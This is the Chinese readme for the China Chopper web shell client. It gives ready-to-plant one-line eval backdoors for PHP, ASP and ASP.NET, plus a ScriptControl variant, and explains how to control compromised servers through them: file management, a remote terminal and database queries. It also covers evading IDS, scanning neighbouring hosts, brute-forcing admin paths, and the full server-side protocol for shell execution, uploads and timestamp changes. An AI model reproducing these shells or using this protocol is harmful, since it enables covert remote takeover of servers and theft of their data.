产品名称：中国菜刀(China chopper)
生产厂家：中国菜刀贸易有限公司
厂家地址：http://www.maicaidao.com/
----------------------------------------------------------------------------------------------------------
免责申明：
	请使用者注意使用环境并遵守国家相关法律法规！
	由于使用不当造成的后果本厂家不承担任何责任！
----------------------------------------------------------------------------------------------------------
友情提示：程序在使用过程中难免有各种BUG，到官网看一下是否有更新吧，说不定己经修补了呢。

UINCODE方式编译，支持多国语言输入显示。
在非简体中文环境下使用，自动更换成英文界面，翻译有误的地方请留言指正。

一、脚本客户端(包括但不限于EVAL)部分
　　1）要了解的
　　服务端只需要简单的一行代码，即可用此程序实现常用的管理功能，功能代码二次编码后发送，过IDS的能力大幅提高。
　　目前支持的服务端脚本：PHP, ASP, ASP.NET，并且支持https安全连接的网站。
　　在服务端运行的代码如下：
　　PHP:    <?php @eval($_POST['pass']);?>
　　ASP:    <%eval request("pass")%>
　　ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
	(注意: ASP.NET要单独一个文件或此文件也是Jscript语言)
　　Customize:	自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与菜刀进行交互即可。

　　2）怎么用
　　在主视图中右键/添加，在弹出的对话框中输入服务端地址，连接的密码(请注意上例中的pass字串)，选择正确的脚本类型和语言编码，
　　保存后即可使用文件管理，虚拟终端，数据库管理三大块功能，同时支持自定义的脚本执行，并可以导入导出数据。
　　要是其它都没错误，那么可能就是你把语言编码选错了。
　　1. 文件管理：[特色]缓存下载目录，并支持离线查看缓存目录;
　　2. 虚拟终端：[特色]人性化的设计，操作方便;(输入HELP查看更多用法)
　　3. 数据库管理：[特色]图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,ACCESS
	以及支持ADO方式连接的数据库。
	(各种脚本条件下的数据库连接方法请点击数据库管理界面左上角处的配置按钮查看)
　　注意：由于服务器的安全设置，某些功能可能不能正常使用。

　　3)  关于配置信息怎么填？
	A)  数据库方面：
	PHP脚本：
	<T>类型</T> 类型可为MYSQL,MSSQL,ORACLE,INFOMIX中的一种
	<H>主机地址<H> 主机地址可为机器名或IP地址，如localhost
	<U>数据库用户</U> 连接数据库的用户名，如root
	<P>数据库密码</P> 连接数据库的密码，如123455

	ASP和ASP.NET脚本：
	<T>类型</T> 类型只能填ADO
	<C>ADO配置信息</C>
	ADO连接各种数据库的方式不一样。如MSSQL的配置信息为
	Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456;
	同时，支持NT验证登录MSSQL数据库，并能把查询的结果列表导出为html文件

	Customize 脚本：
	<T>类型</T> 类型只能填XDB
	<X>与Customize 脚本约定的配置信息</X>
	菜刀自带的server.jsp数据库参数填写方法如下(两行)：
	MSSQL:
<X>
com.microsoft.sqlserver.jdbc.SQLServerDriver
jdbc:sqlserver://127.0.0.1:1433;databaseName=test;user=sa;password=123456
</X>
	MYSQL:
<X>
com.mysql.jdbc.Driver
jdbc:mysql://localhost/test?user=root&password=123456
</X>
	ORACLE:
<X>
oracle.jdbc.driver.OracleDriver
jdbc:oracle:thin:user/password@127.0.0.1:1521/test
</X>

	B) 其它方面：
	添加额外附加提交的数据，如ASP的新服务端是这样的：
	<%
	Set o = Server.CreateObject("ScriptControl")
	o.language = "vbscript"
	o.addcode(Request("SC"))
	o.run "ff",Server,Response,Request,Application,Session,Error
	%>
	那么，菜刀在配置处填入：
	<O>SC=function+ff(Server,Response,Request,Application,Session,Error):eval(request("pass")):end+function</O>
	然后以密码pass来连接即可。

	提交功能前先POST额外的数据包：会话期间只提交一次。
	<POST>https://target.com/cgi-bin/login.cgi</POST>
	<DATA>uid=user1&pwd=123456</DATA>

　　3)  关于HTTP登录验证
	SHELL地址这样填 http://user:pass@server/server.asp
	用户名密码中的特殊字符可用URL编码转换。

二、安全扫描
　　蜘蛛爬行，绑定域名查询，目录爆破。
　　命令解释:
	A) 查单一IP的绑定域名
	{reverse_ip} {url:http://www.test.com/}
	B) 扫描本C段开放的WEB服务器，并查询绑定域名
	{reverse_ip_c} {url:http://www.test.com/}
	C) 只扫描本C段开放的WEB服务器
	{reverse_ip_c} {url:http://www.test.com/} {port}
	D) 蜘蛛爬行
	{spider} {url:http://www.test.com/}
	E) 蜘蛛爬行，并设定爬行范围
	{spider} {url:http://www.test.com/} {range:test.com}
	F) 蜘蛛爬行，过滤重复URL加快速度
	加上 {filter}
	G) 爆破功能，%s为dict中的一行
		flag:后面为返回的数据(含HTTP头部)中的特定关键字
		加!!为不包含关键字为TRUE，否则包含关键字为TRUE
		list.txt为当前目录下的文件，可设为绝对路径，注意：不要包含太多的行。
		注：从20100626版开始，list.txt一定要是UNICODE格式的文本文件
	{crack} {url:http://%s/admin/} {flag:HTTP/1.1 200} {dict:list.txt}
	{crack} {url:http://%s/admin/} {flag:!!HTTP/1.1 404} {dict:list.txt}
	{crack} {url:http://www.test.com/%s/} {flag:successfully} {dict:list.txt}

三、定时提醒
　　当闹钟来用吧, 周期：每月/每周/每日/只一次。

四、快速启动
　　一些常用的快捷方式放在这里，可以指定用户身份运行程序。这部分数据是加密存储的。

五、浏览器
　　就是一个专用的网页浏览器:Post浏览/自定义Cookies,/执行自定义脚本/自动刷新页面/同IP网页搜索。

六、其它部分
　　等待加入。

文件说明：
------------------------------------------------------------------
chopper.exe	菜刀程序
db.mdb		菜刀的主数据库
------------------------------------------------------------------
cache.tmp	菜刀的缓存数据库(可删除)
readme.txt	你现在正在看的(可删除)
[目录]Script	存放菜刀的自写脚本和Customize模式Jsp的一个服务端文件(可删除)


----附---------------------------Customize模式菜刀和服务端通信接口-----------------------------------------------------------------
----------------------------------其它语言的服务端代码可按此接口来编写(请参照server.jsp/server.cfm)---------------------
例：菜刀客户端填写的密码为pass，网页编码选的是GB2312
注：所有参数都以POST提交，返回的数据都要以->|为开始标记，|<-为结束标记
注：返回的错误信息开头包含ERROR:// 
注：\t代表制表符TAB，\r\n代表换行回车，\n代表回车
注：数据库配置信息是一个字符串，服务端脚本可以对此字符串格式进行自定义。

--------------------------------------------------------------------------------------------------------------------------------------------------------
[得到当前目录的绝对路径]
提交：pass=A&z0=GB2312
返回：目录的绝对路径\t，如果是Windows系统后面接着加上驱动器列表
示例：c:\inetpub\wwwroot\	C:D:E:K:
示例：/var/www/html/	

[目录浏览]
提交：pass=B&z0=GB2312&z1=目录绝对路径
返回：先目录后文件,目录名后要加/，文件名后不要加/
示例：
	目录名/\t时间\t大小\t属性\n目录名/\t时间\t大小\t属性\n
	文件名\t时间\t大小\t属性\n文件名\t时间\t大小\t属性\n

[读取文本文件]
提交：pass=C&z0=GB2312&z1=文件绝对路径
返回：文本文件的内容

[写入文本文件]
提交：pass=D&z0=GB2312&z1=文件绝对路径&z2=文件内容
返回：成功返回1,不成功返回错误信息

[删除文件或目录]
提交：pass=E&z0=GB2312&z1=文件或目录的绝对路径
返回：成功返回1,不成功返回错误信息

[下载文件]
提交：pass=F&z0=GB2312&z1=服务器文件的绝对路径
返回：要下载文件的内容

[上传文件]
提交：pass=G&z0=GB2312&z1=文件上传后的绝对路径&z2=文件内容(十六进制文本格式)
返回：要下载文件的内容

[复制文件或目录后粘贴]
提交：pass=H&z0=GB2312&z1=复制的绝对路径&z2=粘贴的绝对路径
返回：成功返回1,不成功返回错误信息

[文件或目录重命名]
提交：pass=I&z0=GB2312&z1=原名(绝对路径)&z2=新名(绝对路径)
返回：成功返回1,不成功返回错误信息

[新建目录]
提交：pass=J&z0=GB2312&z1=新目录名(绝对路径)
返回：成功返回1,不成功返回错误信息

[修改文件或目录时间]
提交：pass=K&z0=GB2312&z1=文件或目录的绝对路径&z2=时间(格式：yyyy-MM-dd HH:mm:ss)
返回：成功返回1,不成功返回错误信息

[下载文件到服务器]
提交：pass=L&z0=GB2312&z1=URL路径&z2=下载后保存的绝对路径
返回：成功返回1,不成功返回错误信息

[执行Shell命令(Shell路径前会根据服务器系统类型加上-c或/c参数)]
提交：pass=M&z0=GB2312&z1=(-c或/c)加Shell路径&z2=Shell命令
返回：命令执行结果

[得到数据库基本信息]
提交：pass=N&z0=GB2312&z1=数据库配置信息
返回：成功返回数据库(以制表符\t分隔)， 不成功返回错误信息

[获取数据库表名]
提交：pass=O&z0=GB2312&z1=数据库配置信息\r\n数据库名
返回：成功返回数据表(以\t分隔)， 不成功返回错误信息

[获取数据表列名]
提交：pass=P&z0=GB2312&z1=数据库配置信息\r\n数据库名\r\n数据表名
返回：成功返回数据列(以制表符\t分隔)， 不成功返回错误信息

[执行数据库命令]
提交：pass=Q&z0=GB2312&z1=数据库配置信息\r\n数据库名&z2=SQL命令
返回：成功返回数据表内容， 不成功返回错误信息
注意：返回的第一行为表头，接下去每行分别在列表中显示，列数要求一致。行中的每列后加上\t|\t标记，每行以标记\r\n为结束

